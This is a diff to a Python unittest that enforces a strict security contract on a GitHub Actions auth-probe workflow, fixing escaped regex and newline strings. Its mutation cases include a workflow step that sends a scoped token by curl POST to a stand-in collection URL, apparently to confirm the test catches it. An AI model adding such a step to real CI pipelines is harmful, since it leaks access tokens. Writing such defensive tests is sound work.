@@ -83,16 +83,16 @@ class SandboxAppAuthProbeContract(unittest.TestCase):
 
     def _assert_strict_gate(self, source):
         # The trigger block must be EXACT, not just contain workflow_dispatch.
-        self.assertRegex(source, r"(?m)^on:\\n  workflow_dispatch: \\{\\}\\n\\npermissions: \\{\\}$")
+        self.assertRegex(source, r"(?m)^on:\n  workflow_dispatch: \{\}\n\npermissions: \{\}$")
         self.assertEqual(
             len(re.findall(r"(?m)^on:$", source)), 1
         )
         self.assertEqual(
-            re.findall(r"(?m)^\\s*repositories:.*$", source),
+            re.findall(r"(?m)^\s*repositories:.*$", source),
             ["          repositories: adcp-mvp-sandbox"],
         )
         self.assertEqual(
-            re.findall(r"(?m)^\\s*environment:.*$", source),
+            re.findall(r"(?m)^\s*environment:.*$", source),
             ["    environment: sandbox-app-probe"],
         )
         token_lines = [
@@ -116,11 +116,11 @@ class SandboxAppAuthProbeContract(unittest.TestCase):
         mutations = {
             "workflow_call": (
                 "  workflow_dispatch: {}",
-                "  workflow_dispatch: {}\\n  workflow_call: {}",
+                "  workflow_dispatch: {}\n  workflow_call: {}",
             ),
             "repository_dispatch": (
                 "  workflow_dispatch: {}",
-                "  workflow_dispatch: {}\\n  repository_dispatch: {}",
+                "  workflow_dispatch: {}\n  repository_dispatch: {}",
             ),
             "extra_repo": (
                 "repositories: adcp-mvp-sandbox",
@@ -132,8 +132,8 @@ class SandboxAppAuthProbeContract(unittest.TestCase):
             ),
             "token_exfiltration_step": (
                 "      # Both token steps automatically revoke",
-                "      - name: Exfiltrate token\\n"
-                "        run: curl -X POST https://example.invalid/collect -d \"$SCOPED_TOKEN\"\\n"
+                "      - name: Exfiltrate token\n"
+                "        run: curl -X POST https://example.invalid/collect -d \"$SCOPED_TOKEN\"\n"
                 "      # Both token steps automatically revoke",
             ),
         }
